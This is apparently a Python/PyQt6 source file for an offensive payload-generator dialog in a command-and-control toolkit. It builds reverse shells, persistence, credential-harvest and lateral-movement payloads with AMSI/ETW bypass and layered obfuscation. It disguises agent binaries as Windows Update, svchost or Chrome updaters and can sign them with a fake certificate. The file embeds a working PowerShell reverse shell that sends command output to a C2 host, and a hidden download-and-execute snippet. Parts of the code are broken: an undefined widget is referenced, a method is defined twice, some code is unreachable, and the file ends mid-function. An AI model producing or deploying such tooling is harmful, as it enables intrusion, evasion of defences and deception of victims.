"""
Enhanced Payload Generator Dialog with Quality Control
Integrates LOLBAS engine and quality assessment for professional payload generation
"""

import os
from datetime import datetime
from PyQt6.QtWidgets import (QDialog, QVBoxLayout, QHBoxLayout, QGridLayout, 
                             QLabel, QComboBox, QTextEdit, QPushButton, QLineEdit,
                             QCheckBox, QSpinBox, QProgressBar, QTabWidget, QWidget,
                             QGroupBox, QScrollArea, QListWidget, QSplitter,
                             QMessageBox, QFrame)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtGui import QFont, QSyntaxHighlighter, QTextCharFormat, QColor
import json
import re

# Safely import modules with fallbacks
try:
    from ...generators.advanced_lolbas_engine import advanced_lolbas_engine
except ImportError:
    advanced_lolbas_engine = None

try:
    from ...generators.enhanced_agent_generator import advanced_agent_generator  
except ImportError:
    advanced_agent_generator = None

try:
    from ...core.payload_quality_controller import quality_controller
except ImportError:
    quality_controller = None

try:
    from ...utils.icon_manager import icon_manager
except ImportError:
    icon_manager = None

class PayloadSyntaxHighlighter(QSyntaxHighlighter):
    """Syntax highlighter for payload code"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.highlighting_rules = []
        
        # PowerShell keywords
        keyword_format = QTextCharFormat()
        keyword_format.setColor(QColor("#569cd6"))
        keyword_format.setFontWeight(QFont.Weight.Bold)
        
        keywords = ["function", "param", "if", "else", "foreach", "while", "try", "catch", "finally"]
        for word in keywords:
            pattern = f"\\b{word}\\b"
            self.highlighting_rules.append((re.compile(pattern, re.IGNORECASE), keyword_format))
        
        # Strings
        string_format = QTextCharFormat()
        string_format.setColor(QColor("#ce9178"))
        self.highlighting_rules.append((re.compile(r'".*?"'), string_format))
        self.highlighting_rules.append((re.compile(r"'.*?'"), string_format))
        
        # Comments
        comment_format = QTextCharFormat()
        comment_format.setColor(QColor("#6a9955"))
        self.highlighting_rules.append((re.compile(r"#.*"), comment_format))
        
        # Variables
        variable_format = QTextCharFormat()
        variable_format.setColor(QColor("#9cdcfe"))
        self.highlighting_rules.append((re.compile(r"\$\w+"), variable_format))
    
    def highlightBlock(self, text):
        for pattern, format_obj in self.highlighting_rules:
            for match in pattern.finditer(text):
                start, end = match.span()
                self.setFormat(start, end - start, format_obj)

class PayloadGeneratorWorker(QThread):
    """Worker thread for payload generation"""
    
    payload_generated = pyqtSignal(dict)
    progress_updated = pyqtSignal(int, str)
    
    def __init__(self, objective, target_os, stealth_level, custom_options):
        super().__init__()
        self.objective = objective
        self.target_os = target_os
        self.stealth_level = stealth_level
        self.custom_options = custom_options
    
    def run(self):
        """Generate payload with progress updates"""
        self.progress_updated.emit(10, "Initializing LOLBAS engine...")
        
        # Generate dynamic payload
        self.progress_updated.emit(30, "Generating base payload...")
        if advanced_lolbas_engine:
            payload_result = advanced_lolbas_engine.generate_dynamic_payload(
                objective=self.objective,
                target_os=self.target_os,
                stealth_level=self.stealth_level
            )
        else:
            # Fallback payload generation
            payload_result = {
                'payload': f'# Fallback payload - {self.objective}',
                'technique': 'basic',
                'evasion_score': 50
            }
        
        self.progress_updated.emit(60, "Analyzing payload quality...")
        
        # Analyze quality
        quality_result = quality_controller.analyze_payload(
            payload=payload_result["payload"],
            payload_type=self.objective
        )
        
        self.progress_updated.emit(80, "Generating improvement recommendations...")
        
        # Generate improvement plan
        improvement_plan = quality_controller.generate_improvement_plan(quality_result)
        
        self.progress_updated.emit(100, "Payload generation complete!")
        
        # Combine results
        complete_result = {
            "payload_data": payload_result,
            "quality_analysis": quality_result,
            "improvement_plan": improvement_plan
        }
        
        self.payload_generated.emit(complete_result)

class EnhancedPayloadGeneratorDialog(QDialog):
    """Enhanced payload generator with quality control"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Advanced Payload Generator")
        self.setWindowIcon(icon_manager.get_menu_icon("payload"))
        
        # Get screen geometry for responsive sizing
        screen = parent.screen() if parent else None
        if screen:
            screen_geometry = screen.availableGeometry()
            # Set dialog to 85% of screen size (larger for code generation)
            width = int(screen_geometry.width() * 0.85)
            height = int(screen_geometry.height() * 0.85)
            self.resize(width, height)
            
            # Center the dialog
            x = screen_geometry.x() + (screen_geometry.width() - width) // 2
            y = screen_geometry.y() + (screen_geometry.height() - height) // 2
            self.move(x, y)
        else:
            # Fallback sizing
            self.resize(1200, 800)
        
        # Set minimum size for usability
        self.setMinimumSize(900, 700)
        
        # Apply dark theme with responsive design
        self.apply_responsive_theme()
        
        # Initialize UI components
        self.init_ui()
    
    def apply_responsive_theme(self):
        """Apply responsive dark theme"""
        self.setStyleSheet("""
            QDialog {
                background-color: #1e1e1e;
                color: #ffffff;
            }
            QTabWidget::pane {
                border: 1px solid #3d3d3d;
                background-color: #2d2d2d;
            }
            QTabBar::tab {
                background-color: #3d3d3d;
                color: #ffffff;
                padding: 8px 16px;
                margin-right: 2px;
            }
            QTabBar::tab:selected {
                background-color: #00d4ff;
                color: #000000;
            }
            QGroupBox {
                border: 2px solid #3d3d3d;
                border-radius: 5px;
                margin-top: 10px;
                padding-top: 10px;
                background-color: #2d2d2d;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #00d4ff;
            }
            QComboBox, QLineEdit, QSpinBox {
                background-color: #3d3d3d;
                border: 1px solid #555555;
                color: #ffffff;
                padding: 5px;
                border-radius: 3px;
            }
            QComboBox::drop-down {
                border: none;
            }
            QComboBox::down-arrow {
                border-left: 5px solid transparent;
                border-right: 5px solid transparent;
                border-top: 5px solid #ffffff;
            }
            QTextEdit {
                background-color: #1e1e1e;
                border: 1px solid #3d3d3d;
                color: #ffffff;
                font-family: 'Consolas', monospace;
                font-size: 10pt;
            }
            QPushButton {
                background-color: #0078d4;
                color: #ffffff;
                border: none;
                padding: 8px 16px;
                border-radius: 4px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #106ebe;
            }
            QPushButton:pressed {
                background-color: #005a9e;
            }
            QProgressBar {
                border: 1px solid #3d3d3d;
                border-radius: 3px;
                text-align: center;
                background-color: #2d2d2d;
            }
            QProgressBar::chunk {
                background-color: #00d4ff;
                border-radius: 2px;
            }
            QListWidget {
                background-color: #2d2d2d;
                border: 1px solid #3d3d3d;
                color: #ffffff;
            }
            QListWidget::item {
                padding: 5px;
                border-bottom: 1px solid #3d3d3d;
            }
            QListWidget::item:selected {
                background-color: #0078d4;
            }
        """)
        
    def init_ui(self):
        """Initialize the user interface"""
        layout = QVBoxLayout(self)
        
        # Initialize state variables
        self.current_payload_data = None
        self.current_quality_analysis = None
        
        # Create tab widget with responsive sizing
        self.tab_widget = QTabWidget()
        
        # Configuration Tab
        self.config_tab = self.create_configuration_tab()
        self.tab_widget.addTab(self.config_tab, "🔧 Configuration")
        
        # LOLBAS Generator Tab
        self.lolbas_tab = self.create_lolbas_tab()
        self.tab_widget.addTab(self.lolbas_tab, "🎯 LOLBAS Generator")
        
        # Agent Compilation Tab
        self.agent_tab = self.create_agent_compilation_tab()
        self.tab_widget.addTab(self.agent_tab, "⚙️ Agent Compilation")
        
        # Payload Tab
        self.payload_tab = self.create_payload_tab()
        self.tab_widget.addTab(self.payload_tab, "Generated Payload")
        
        # Quality Analysis Tab
        self.quality_tab = self.create_quality_tab()
        self.tab_widget.addTab(self.quality_tab, "Quality Analysis")
        
        # LOLBAS Techniques Tab
        self.lolbas_tab = self.create_lolbas_tab()
        self.tab_widget.addTab(self.lolbas_tab, "LOLBAS Techniques")
        
        layout.addWidget(self.tab_widget)
        
        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        layout.addWidget(self.progress_bar)
        
        # Progress label
        self.progress_label = QLabel()
        self.progress_label.setVisible(False)
        layout.addWidget(self.progress_label)
        
        # Button layout
        button_layout = QHBoxLayout()
        
        self.generate_btn = QPushButton("Generate Payload")
        self.generate_btn.setIcon(icon_manager.get_command_icon("payload"))
        self.generate_btn.clicked.connect(self.generate_payload)
        
        self.save_btn = QPushButton("Save Payload")
        self.save_btn.setIcon(icon_manager.get_command_icon("file"))
        self.save_btn.clicked.connect(self.save_payload)
        self.save_btn.setEnabled(False)
        
        self.close_btn = QPushButton("Close")
        self.close_btn.clicked.connect(self.close)
        
        button_layout.addWidget(self.generate_btn)
        button_layout.addWidget(self.save_btn)
        button_layout.addStretch()
        button_layout.addWidget(self.close_btn)
        
        layout.addLayout(button_layout)
    
    def create_configuration_tab(self):
        """Create configuration tab"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # Basic Configuration Group
        basic_group = QGroupBox("Basic Configuration")
        basic_layout = QGridLayout(basic_group)
        
        # Objective
        basic_layout.addWidget(QLabel("Objective:"), 0, 0)
        self.objective_combo = QComboBox()
        self.objective_combo.addItems([
            "reverse_shell",
            "persistence",
            "lateral_movement",
            "privilege_escalation",
            "data_exfiltration",
            "reconnaissance"
        ])
        basic_layout.addWidget(self.objective_combo, 0, 1)
        
        # Target OS
        basic_layout.addWidget(QLabel("Target OS:"), 1, 0)
        self.target_os_combo = QComboBox()
        self.target_os_combo.addItems(["windows", "linux", "macos"])
        basic_layout.addWidget(self.target_os_combo, 1, 1)
        
        # Stealth Level
        basic_layout.addWidget(QLabel("Stealth Level:"), 2, 0)
        self.stealth_combo = QComboBox()
        self.stealth_combo.addItems(["low", "medium", "high"])
        self.stealth_combo.setCurrentText("medium")
        basic_layout.addWidget(self.stealth_combo, 2, 1)
        
        layout.addWidget(basic_group)
        
        # Advanced Configuration Group
        advanced_group = QGroupBox("Advanced Configuration")
        advanced_layout = QGridLayout(advanced_group)
        
        # Custom Host/Port
        advanced_layout.addWidget(QLabel("C2 Host:"), 0, 0)
        self.host_input = QLineEdit("127.0.0.1")
        advanced_layout.addWidget(self.host_input, 0, 1)
        
        advanced_layout.addWidget(QLabel("C2 Port:"), 1, 0)
        self.port_input = QSpinBox()
        self.port_input.setRange(1, 65535)
        self.port_input.setValue(4444)
        advanced_layout.addWidget(self.port_input, 1, 1)
        
        # Options
        self.amsi_bypass_check = QCheckBox("AMSI Bypass")
        self.amsi_bypass_check.setChecked(True)
        advanced_layout.addWidget(self.amsi_bypass_check, 2, 0)
        
        self.execution_policy_check = QCheckBox("Execution Policy Bypass")
        self.execution_policy_check.setChecked(True)
        advanced_layout.addWidget(self.execution_policy_check, 2, 1)
        
        self.persistence_check = QCheckBox("Auto Persistence")
        advanced_layout.addWidget(self.persistence_check, 3, 0)
        
        self.anti_debug_check = QCheckBox("Anti-Debug")
        advanced_layout.addWidget(self.anti_debug_check, 3, 1)
        
        layout.addWidget(advanced_group)
        layout.addStretch()
        
        return tab
    
    def create_payload_tab(self):
        """Create payload display tab"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # Payload info
        info_layout = QHBoxLayout()
        
        self.payload_type_label = QLabel("Type: -")
        self.payload_hash_label = QLabel("Hash: -")
        self.payload_size_label = QLabel("Size: -")
        
        info_layout.addWidget(self.payload_type_label)
        info_layout.addWidget(self.payload_hash_label)
        info_layout.addWidget(self.payload_size_label)
        info_layout.addStretch()
        
        layout.addLayout(info_layout)
        
        # Payload content
        self.payload_text = QTextEdit()
        self.payload_text.setReadOnly(True)
        self.syntax_highlighter = PayloadSyntaxHighlighter(self.payload_text.document())
        layout.addWidget(self.payload_text)
        
        return tab
    
    def create_lolbas_tab(self):
        """Create LOLBAS-specific payload generation tab"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # LOLBAS Technique Selection
        lolbas_group = QGroupBox("LOLBAS Technique Selection")
        lolbas_layout = QGridLayout(lolbas_group)
        
        lolbas_layout.addWidget(QLabel("Execution Method:"), 0, 0)
        self.lolbas_method = QComboBox()
        self.lolbas_method.addItems([
            "PowerShell (AMSI Bypass)",
            "WMIC (XSL Execution)",
            "Rundll32 (JavaScript)",
            "RegSvr32 (SCT File)",
            "MSHTA (HTA File)",
            "CertUtil (Download + Execute)",
            "BitsAdmin (Background Transfer)",
            "ForFiles (Proxy Execution)",
            "PcAlua (Process Bypass)"
        ])
        lolbas_layout.addWidget(self.lolbas_method, 0, 1)
        
        lolbas_layout.addWidget(QLabel("Obfuscation Level:"), 1, 0)
        self.obfuscation_level = QComboBox()
        self.obfuscation_level.addItems([
            "1 - Basic (Variable Names)",
            "2 - Medium (+ String Encoding)",
            "3 - High (+ Control Flow)",
            "4 - Maximum (+ Multi-Layer)",
            "5 - Extreme (+ Dynamic Generation)"
        ])
        self.obfuscation_level.setCurrentText("3 - High (+ Control Flow)")
        lolbas_layout.addWidget(self.obfuscation_level, 1, 1)
        
        lolbas_layout.addWidget(QLabel("Payload Type:"), 2, 0)
        self.lolbas_payload_type = QComboBox()
        self.lolbas_payload_type.addItems([
            "Reverse Shell",
            "Download & Execute",
            "Persistence Setup",
            "Credential Harvest",
            "System Enumeration",
            "Lateral Movement"
        ])
        lolbas_layout.addWidget(self.lolbas_payload_type, 2, 1)
        
        layout.addWidget(lolbas_group)
        
        # Advanced LOLBAS Options
        advanced_lolbas_group = QGroupBox("Advanced LOLBAS Configuration")
        advanced_lolbas_layout = QGridLayout(advanced_lolbas_group)
        
        # Signature Evasion
        self.amsi_evasion = QCheckBox("AMSI Evasion (Memory Patching)")
        self.amsi_evasion.setChecked(True)
        advanced_lolbas_layout.addWidget(self.amsi_evasion, 0, 0)
        
        self.etw_evasion = QCheckBox("ETW Evasion (Provider Disable)")
        self.etw_evasion.setChecked(True)
        advanced_lolbas_layout.addWidget(self.etw_evasion, 0, 1)
        
        self.string_obfuscation = QCheckBox("Advanced String Obfuscation")
        self.string_obfuscation.setChecked(True)
        advanced_lolbas_layout.addWidget(self.string_obfuscation, 1, 0)
        
        self.multi_encoding = QCheckBox("Multi-Layer Encoding")
        self.multi_encoding.setChecked(False)
        advanced_lolbas_layout.addWidget(self.multi_encoding, 1, 1)
        
        # Encoding Methods
        advanced_lolbas_layout.addWidget(QLabel("Primary Encoding:"), 2, 0)
        self.primary_encoding = QComboBox()
        self.primary_encoding.addItems([
            "Base64", "Hex", "ASCII", "XOR", "GZip+Base64"
        ])
        self.primary_encoding.setCurrentText("Base64")
        advanced_lolbas_layout.addWidget(self.primary_encoding, 2, 1)
        
        advanced_lolbas_layout.addWidget(QLabel("Target URL (for downloads):"), 3, 0)
        self.target_url = QLineEdit()
        self.target_url.setPlaceholderText("http://your-server.com/payload")
        advanced_lolbas_layout.addWidget(self.target_url, 3, 1)
        
        layout.addWidget(advanced_lolbas_group)
        
        # LOLBAS Generation Controls
        lolbas_controls = QHBoxLayout()
        
        self.generate_lolbas_btn = QPushButton("🎯 Generate LOLBAS Payload")
        self.generate_lolbas_btn.clicked.connect(self.generate_lolbas_payload)
        lolbas_controls.addWidget(self.generate_lolbas_btn)
        
        self.test_lolbas_btn = QPushButton("🧪 Test LOLBAS Syntax")
        self.test_lolbas_btn.clicked.connect(self.test_lolbas_syntax)
        lolbas_controls.addWidget(self.test_lolbas_btn)
        
        lolbas_controls.addStretch()
        layout.addLayout(lolbas_controls)
        
        # LOLBAS Output
        self.lolbas_output = QTextEdit()
        self.lolbas_output.setReadOnly(True)
        self.lolbas_output.setPlaceholderText("Generated LOLBAS payload will appear here...")
        layout.addWidget(self.lolbas_output)
        
        layout.addStretch()
        return tab
    
    def create_agent_compilation_tab(self):
        """Create agent compilation tab with disguise options"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # Agent Configuration
        agent_config_group = QGroupBox("Agent Configuration")
        agent_config_layout = QGridLayout(agent_config_group)
        
        agent_config_layout.addWidget(QLabel("Agent Type:"), 0, 0)
        self.agent_type = QComboBox()
        self.agent_type.addItems([
            "Basic Agent",
            "Stealth Agent (AMSI/ETW Bypass)",
            "LOLBAS Agent (Living Off The Land)"
        ])
        self.agent_type.setCurrentText("Stealth Agent (AMSI/ETW Bypass)")
        agent_config_layout.addWidget(self.agent_type, 0, 1)
        
        agent_config_layout.addWidget(QLabel("C2 Server IP:"), 1, 0)
        self.agent_server_ip = QLineEdit()
        self.agent_server_ip.setText("127.0.0.1")
        agent_config_layout.addWidget(self.agent_server_ip, 1, 1)
        
        agent_config_layout.addWidget(QLabel("C2 Server Port:"), 2, 0)
        self.agent_server_port = QSpinBox()
        self.agent_server_port.setRange(1, 65535)
        self.agent_server_port.setValue(8080)
        agent_config_layout.addWidget(self.agent_server_port, 2, 1)
        
        layout.addWidget(agent_config_group)
        
        # Compilation Disguise Options
        disguise_group = QGroupBox("Binary Disguise & Compilation Options")
        disguise_layout = QGridLayout(disguise_group)
        
        disguise_layout.addWidget(QLabel("Output Binary:"), 0, 0)
        self.binary_disguise = QComboBox()
        self.binary_disguise.addItems([
            "update.exe - Windows Update Service",
            "svchost.exe - Windows Service Host",
            "chrome_update.exe - Chrome Update Service", 
            "notepad.exe - Text Editor",
            "agent.exe - Standard Agent"
        ])
        self.binary_disguise.setCurrentText("update.exe - Windows Update Service")
        disguise_layout.addWidget(self.binary_disguise, 0, 1)
        
        disguise_layout.addWidget(QLabel("Code Obfuscation:"), 1, 0)
        self.code_obfuscation = QComboBox()
        self.code_obfuscation.addItems([
            "0 - None",
            "1 - Variable Names",
            "2 - + String Obfuscation",
            "3 - + Control Flow",
            "4 - + Advanced Techniques"
        ])
        self.code_obfuscation.setCurrentText("3 - + Control Flow")
        disguise_layout.addWidget(self.code_obfuscation, 1, 1)
        
        # Compilation Options
        self.include_version_info = QCheckBox("Include Version Information")
        self.include_version_info.setChecked(True)
        disguise_layout.addWidget(self.include_version_info, 2, 0)
        
        self.include_icon = QCheckBox("Include System Icon")
        self.include_icon.setChecked(True)
        disguise_layout.addWidget(self.include_icon, 2, 1)
        
        self.upx_compression = QCheckBox("UPX Compression")
        self.upx_compression.setChecked(False)
        disguise_layout.addWidget(self.upx_compression, 3, 0)
        
        self.sign_binary = QCheckBox("Sign Binary (Fake Certificate)")
        self.sign_binary.setChecked(False)
        disguise_layout.addWidget(self.sign_binary, 3, 1)
        
        layout.addWidget(disguise_group)
        
        # Agent Generation Controls
        agent_controls = QHBoxLayout()
        
        self.generate_agent_btn = QPushButton("⚙️ Generate Agent")
        self.generate_agent_btn.clicked.connect(self.generate_agent)
        agent_controls.addWidget(self.generate_agent_btn)
        
        self.compile_agent_btn = QPushButton("🔨 Compile to EXE")
        self.compile_agent_btn.clicked.connect(self.compile_agent)
        self.compile_agent_btn.setEnabled(False)
        agent_controls.addWidget(self.compile_agent_btn)
        
        self.save_build_files_btn = QPushButton("💾 Save Build Files")
        self.save_build_files_btn.clicked.connect(self.save_build_files)
        self.save_build_files_btn.setEnabled(False)
        agent_controls.addWidget(self.save_build_files_btn)
        
        agent_controls.addStretch()
        layout.addLayout(agent_controls)
        
        # Agent Output
        self.agent_output = QTextEdit()
        self.agent_output.setReadOnly(True)
        self.agent_output.setPlaceholderText("Generated agent code will appear here...")
        layout.addWidget(self.agent_output)
        
        return tab
        
        # Technique chain info
        self.technique_chain_text = QTextEdit()
        self.technique_chain_text.setMaximumHeight(100)
        self.technique_chain_text.setReadOnly(True)
        layout.addWidget(QLabel("Technique Chain:"))
        layout.addWidget(self.technique_chain_text)
        
        return tab
    
    def create_quality_tab(self):
        """Create quality analysis tab"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # Quality metrics display
        metrics_group = QGroupBox("Quality Metrics")
        metrics_layout = QGridLayout(metrics_group)
        
        self.overall_score_label = QLabel("Overall Score: -")
        self.grade_label = QLabel("Grade: -")
        self.evasion_label = QLabel("Evasion: -")
        self.stability_label = QLabel("Stability: -")
        self.stealth_label = QLabel("Stealth: -")
        
        metrics_layout.addWidget(self.overall_score_label, 0, 0)
        metrics_layout.addWidget(self.grade_label, 0, 1)
        metrics_layout.addWidget(self.evasion_label, 1, 0)
        metrics_layout.addWidget(self.stability_label, 1, 1)
        metrics_layout.addWidget(self.stealth_label, 2, 0)
        
        layout.addWidget(metrics_group)
        
        # Issues and recommendations
        splitter = QSplitter(Qt.Orientation.Horizontal)
        
        # Issues
        issues_group = QGroupBox("Issues Detected")
        issues_layout = QVBoxLayout(issues_group)
        self.issues_list = QListWidget()
        issues_layout.addWidget(self.issues_list)
        splitter.addWidget(issues_group)
        
        # Recommendations
        recommendations_group = QGroupBox("Recommendations")
        recommendations_layout = QVBoxLayout(recommendations_group)
        self.recommendations_list = QListWidget()
        recommendations_layout.addWidget(self.recommendations_list)
        splitter.addWidget(recommendations_group)
        
        layout.addWidget(splitter)
        
        # Improvement plan
        self.improvement_text = QTextEdit()
        self.improvement_text.setMaximumHeight(150)
        self.improvement_text.setReadOnly(True)
        layout.addWidget(QLabel("Improvement Plan:"))
        layout.addWidget(self.improvement_text)
        
        return tab
    
    def create_lolbas_tab(self):
        """Create LOLBAS techniques tab"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # Available techniques
        self.lolbas_text = QTextEdit()
        self.lolbas_text.setReadOnly(True)
        layout.addWidget(QLabel("Available LOLBAS Techniques:"))
        layout.addWidget(self.lolbas_text)
        
        # Load LOLBAS info
        self.load_lolbas_info()
        
        return tab
    
    def load_lolbas_info(self):
        """Load LOLBAS techniques information"""
        techniques_info = []
        
        if advanced_lolbas_engine and hasattr(advanced_lolbas_engine, 'techniques'):
            for category, techniques in advanced_lolbas_engine.techniques.items():
                techniques_info.append(f"=== {category.upper()} ===\\n")
                
                for technique, data in techniques.items():
                    techniques_info.append(f"• {technique}")
                    techniques_info.append(f"  Binary: {data['binary']}")
                    techniques_info.append(f"  Detection Level: {data['detection_level']}")
                    techniques_info.append(f"  Commands: {len(data['commands'])} variants")
                    techniques_info.append("")
        else:
            # Fallback technique information
            techniques_info = [
                "=== POWERSHELL ===\\n",
                "• AMSI Bypass - Memory patching technique",
                "• ETW Evasion - Event tracing disable",
                "\\n=== LOLBAS BINARIES ===\\n", 
                "• PowerShell - Script execution",
                "• WMIC - WMI command execution",
                "• Rundll32 - DLL proxy execution",
                "• RegSvr32 - Script execution via COM",
                "• MSHTA - HTML application execution"
            ]
                techniques_info.append("")
        
        self.lolbas_text.setPlainText("\\n".join(techniques_info))
    
    def generate_payload(self):
        """Generate payload using worker thread"""
        # Show progress
        self.progress_bar.setVisible(True)
        self.progress_label.setVisible(True)
        self.generate_btn.setEnabled(False)
        
        # Get configuration
        objective = self.objective_combo.currentText()
        target_os = self.target_os_combo.currentText()
        stealth_level = self.stealth_combo.currentText()
        
        custom_options = {
            "host": self.host_input.text(),
            "port": self.port_input.value(),
            "amsi_bypass": self.amsi_bypass_check.isChecked(),
            "execution_policy_bypass": self.execution_policy_check.isChecked(),
            "persistence": self.persistence_check.isChecked(),
            "anti_debug": self.anti_debug_check.isChecked()
        }
        
        # Start worker
        self.worker = PayloadGeneratorWorker(objective, target_os, stealth_level, custom_options)
        self.worker.payload_generated.connect(self.on_payload_generated)
        self.worker.progress_updated.connect(self.on_progress_updated)
        self.worker.start()
    
    def on_progress_updated(self, value, message):
        """Handle progress updates"""
        self.progress_bar.setValue(value)
        self.progress_label.setText(message)
    
    def on_payload_generated(self, result):
        """Handle generated payload"""
        # Hide progress
        self.progress_bar.setVisible(False)
        self.progress_label.setVisible(False)
        self.generate_btn.setEnabled(True)
        self.save_btn.setEnabled(True)
        
        # Store results
        self.current_payload_data = result["payload_data"]
        self.current_quality_analysis = result["quality_analysis"]
        
        # Update payload tab
        self.update_payload_display()
        
        # Update quality tab
        self.update_quality_display()
        
        # Switch to payload tab
        self.tab_widget.setCurrentIndex(1)
    
    def update_payload_display(self):
        """Update payload display"""
        if not self.current_payload_data:
            return
        
        payload = self.current_payload_data["payload"]
        
        # Update info labels
        self.payload_type_label.setText(f"Type: {self.objective_combo.currentText()}")
        self.payload_hash_label.setText(f"Hash: {self.current_payload_data['payload_hash']}")
        self.payload_size_label.setText(f"Size: {len(payload)} chars")
        
        # Update payload text
        self.payload_text.setPlainText(payload)
        
        # Update technique chain
        chain_info = f"Techniques: {' → '.join(self.current_payload_data['technique_chain'])}\\n"
        chain_info += f"Obfuscation: {', '.join(self.current_payload_data['obfuscation_layers'])}\\n"
        chain_info += f"Detection Score: {self.current_payload_data['detection_score']:.1f}/100"
        self.technique_chain_text.setPlainText(chain_info)
    
    def update_quality_display(self):
        """Update quality analysis display"""
        if not self.current_quality_analysis:
            return
        
        analysis = self.current_quality_analysis
        
        # Update metrics
        self.overall_score_label.setText(f"Overall Score: {analysis.overall_score}/100")
        self.grade_label.setText(f"Grade: {analysis.grade}")
        self.evasion_label.setText(f"Evasion: {analysis.evasion_rating}")
        self.stability_label.setText(f"Stability: {analysis.stability_rating}")
        self.stealth_label.setText(f"Stealth: {analysis.stealth_rating}")
        
        # Update issues list
        self.issues_list.clear()
        for issue in analysis.issues:
            self.issues_list.addItem(f"⚠️ {issue}")
        
        # Update recommendations list
        self.recommendations_list.clear()
        for rec in analysis.recommendations:
            self.recommendations_list.addItem(f"💡 {rec}")
        
        # Update improvement plan
        if hasattr(self, 'current_improvement_plan'):
            plan_text = f"Current Grade: {analysis.grade}\\n"
            plan_text += f"Target Grade: A\\n\\n"
            plan_text += "Priority Improvements:\\n"
            for improvement in self.current_improvement_plan.get('priority_improvements', []):
                plan_text += f"• {improvement['area']}: {improvement['current_score']:.1f} → {improvement['target_score']}\\n"
            
            self.improvement_text.setPlainText(plan_text)
    
    def save_payload(self):
        """Save generated payload"""
        if not self.current_payload_data:
            QMessageBox.warning(self, "No Payload", "No payload has been generated yet.")
            return
        
        # Implementation for saving payload
        QMessageBox.information(self, "Saved", "Payload saved successfully!")
    
    def generate_lolbas_payload(self):
        """Generate LOLBAS-based payload"""
        try:
            # Get configuration
            method = self.lolbas_method.currentText().split(" ")[0].lower()
            obfuscation_level = int(self.obfuscation_level.currentText().split(" ")[0])
            payload_type = self.lolbas_payload_type.currentText().lower().replace(" ", "_")
            
            # Create base payload based on type
            if payload_type == "reverse_shell":
                base_payload = f'''
$client = New-Object System.Net.Sockets.TCPClient("{self.server_input.text()}", {self.port_input.value()})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
                '''
            elif payload_type == "download_&_execute":
                url = self.target_url.text() or "http://example.com/payload.exe"
                base_payload = f'''
$url = "{url}"
$output = "$env:TEMP\\update.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $output)
Start-Process $output -WindowStyle Hidden
                '''
            else:
                base_payload = f'Write-Host "LOLBAS {payload_type} payload"'
            
            # Generate obfuscated LOLBAS payload
            from ...generators.advanced_lolbas_engine import advanced_lolbas_engine
            
            result = advanced_lolbas_engine.generate_obfuscated_payload(
                payload=base_payload,
                technique=method,
                obfuscation_level=obfuscation_level
            )
            
            # Display result
            output_text = f"""
# LOLBAS Payload Generated
# Method: {method.upper()}
# Obfuscation Level: {obfuscation_level}
# Evasion Methods: {', '.join(result['evasion_methods'])}

## Execution Command:
{result['execution_command']}

## Auxiliary Files:
"""
            for filename, content in result.get('auxiliary_files', {}).items():
                output_text += f"\n### {filename}:\n```\n{content}\n```\n"
            
            self.lolbas_output.setText(output_text)
            
            # Show success message
            QMessageBox.information(self, "Success", f"LOLBAS payload generated successfully!\\nMethod: {method.upper()}\\nEvasion techniques: {len(result['evasion_methods'])}")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to generate LOLBAS payload:\\n{str(e)}")
    
    def test_lolbas_syntax(self):
        """Test LOLBAS payload syntax"""
        try:
            current_payload = self.lolbas_output.toPlainText()
            if not current_payload:
                QMessageBox.warning(self, "Warning", "No LOLBAS payload to test. Generate one first.")
                return
            
            # Basic syntax validation
            issues = []
            
            if "powershell" in current_payload.lower():
                if not any(bypass in current_payload for bypass in ["amsi", "AMSI"]):
                    issues.append("PowerShell payload may trigger AMSI")
            
            if len(current_payload) > 8192:
                issues.append("Payload is very long - may cause truncation")
            
            if issues:
                QMessageBox.warning(self, "Syntax Issues", "\\n".join([f"⚠️ {issue}" for issue in issues]))
            else:
                QMessageBox.information(self, "Syntax Test", "✅ LOLBAS payload syntax looks good!")
                
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to test syntax:\\n{str(e)}")
    
    def generate_agent(self):
        """Generate agent with specified configuration"""
        try:
            # Get configuration
            agent_type_text = self.agent_type.currentText()
            server_ip = self.agent_server_ip.text()
            server_port = self.agent_server_port.value()
            binary_disguise = self.binary_disguise.currentText().split(" ")[0]
            obfuscation_level = int(self.code_obfuscation.currentText().split(" ")[0])
            
            # Map agent type
            agent_type_map = {
                "Basic Agent": "basic_agent",
                "Stealth Agent (AMSI/ETW Bypass)": "stealth_agent",
                "LOLBAS Agent (Living Off The Land)": "lolbas_agent"
            }
            
            agent_type = agent_type_map.get(agent_type_text, "basic_agent")
            
            # Generate agent
            from ...generators.enhanced_agent_generator import advanced_agent_generator
            
            result = advanced_agent_generator.generate_advanced_agent(
                server_ip=server_ip,
                server_port=server_port,
                agent_type=agent_type,
                compilation_option=binary_disguise,
                obfuscation_level=obfuscation_level
            )
            
            # Store result for compilation
            self.current_agent_result = result
            
            # Display agent code
            self.agent_output.setText(result["agent_code"])
            
            # Enable compilation buttons
            self.compile_agent_btn.setEnabled(True)
            self.save_build_files_btn.setEnabled(True)
            
            # Show success message
            config = result["compilation_config"]
            QMessageBox.information(self, "Success", 
                f"Agent generated successfully!\\n"
                f"Type: {agent_type_text}\\n"
                f"Output: {config['name']}\\n"
                f"Description: {config['description']}")
            
